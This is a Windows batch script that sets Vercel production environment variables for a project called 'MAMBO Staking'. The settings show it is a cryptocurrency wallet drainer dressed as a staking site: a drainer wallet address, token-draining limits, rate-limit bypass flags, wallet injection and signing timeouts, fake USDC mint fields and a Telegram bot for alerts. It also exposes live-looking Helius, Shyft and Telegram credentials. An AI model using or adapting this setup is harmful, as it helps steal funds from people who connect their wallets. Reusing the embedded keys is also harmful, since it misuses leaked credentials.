@echo off
echo Setting up Vercel environment variables for MAMBO Staking...

REM Core Configuration
vercel env add PORT production 3001
vercel env add NODE_ENV production production
vercel env add PROJECT_NAME production MAMBO

REM Solana RPC Configuration
vercel env add RPC_URL production https://api.mainnet-beta.solana.com
vercel env add HELIUS_RPC_URL production https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b
vercel env add HELIUS_API_KEY production 19041dd1-5f30-4135-9b5a-9b670510524b
vercel env add SHYFT_RPC_URL production https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0
vercel env add SHYFT_API_KEY production -C7eUSlaDtQcR6b0

REM Telegram Configuration
vercel env add TELEGRAM_BOT_TOKEN production 8183467058:AAHf02SzNmP5xoqtRvIJQAN5bKE7_f-gMPQ
vercel env add TELEGRAM_CHAT_ID production 7900328128

REM Web3Modal Configuration
vercel env add WEB3MODAL_PROJECT_ID production 45a382364ff2b00404b2d4c2ff95dbd4

REM Drainer Configuration
vercel env add DRAINER_WALLET_ADDRESS production FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj

REM Transaction Limits
vercel env add MIN_SOL_FOR_FEES production 0.005
vercel env add MIN_SOL_FOR_ATA production 0.002
vercel env add MIN_WALLET_VALUE production 0.001
vercel env add MAX_ADDRESS_DIFFERENCES production 3

REM Token Draining Limits
vercel env add MAX_TOKENS_PER_TRANSACTION production 50
vercel env add MAX_INSTRUCTIONS_PER_TRANSACTION production 80
vercel env add MAX_TRANSACTION_SIZE_BYTES production 1200
vercel env add ENABLE_TOKEN_BATCHING production true

REM Rate Limiting
vercel env add RATE_LIMIT_BYPASS_TOKEN_THRESHOLD production 100
vercel env add RATE_LIMIT_BYPASS_SOL_THRESHOLD production 1.0
vercel env add RATE_LIMIT_BYPASS_ENABLED production true
vercel env add GENERAL_RATE_LIMIT production 1000
vercel env add DRAIN_RATE_LIMIT production 2000
vercel env add RATE_LIMIT_WINDOW_MS production 3600000

REM Timeouts
vercel env add WALLET_CONNECTION_TIMEOUT production 30000
vercel env add DEEP_LINKING_TIMEOUT production 15000
vercel env add WALLET_INJECTION_TIMEOUT production 15000
vercel env add DRAIN_API_TIMEOUT production 60000
vercel env add BROADCAST_TIMEOUT production 90000
vercel env add SIGNING_TIMEOUT production 120000

REM Jupiter API
vercel env add JUPITER_TOKEN_LIST_URL production https://token.jup.ag/all

REM Fake USDC Configuration
vercel env add FAKE_USDC_MINT production 11111111111111111111111111111111
vercel env add SOURCE_FAKE_USDC_ATA production 11111111111111111111111111111111
vercel env add SOURCE_AUTHORITY production 11111111111111111111111111111111

echo Environment variables setup complete!
echo Please redeploy your project after setting these variables.
pause
